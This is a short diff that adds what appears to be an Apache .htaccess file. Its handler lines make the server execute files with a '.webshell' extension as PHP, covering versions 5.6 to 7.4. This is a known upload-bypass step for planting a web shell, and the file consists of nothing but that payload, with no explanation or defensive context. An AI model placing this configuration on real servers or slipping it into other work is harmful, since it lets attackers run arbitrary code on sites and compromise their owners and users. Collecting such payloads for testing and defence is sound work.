@@ -1,0 +1,6 @@
+AddHandler application/x-httpd-php56 .webshell
+AddHandler application/x-httpd-php70 .webshell
+AddHandler application/x-httpd-php71 .webshell
+AddHandler application/x-httpd-php72 .webshell
+AddHandler application/x-httpd-php73 .webshell
+AddHandler application/x-httpd-php74 .webshell
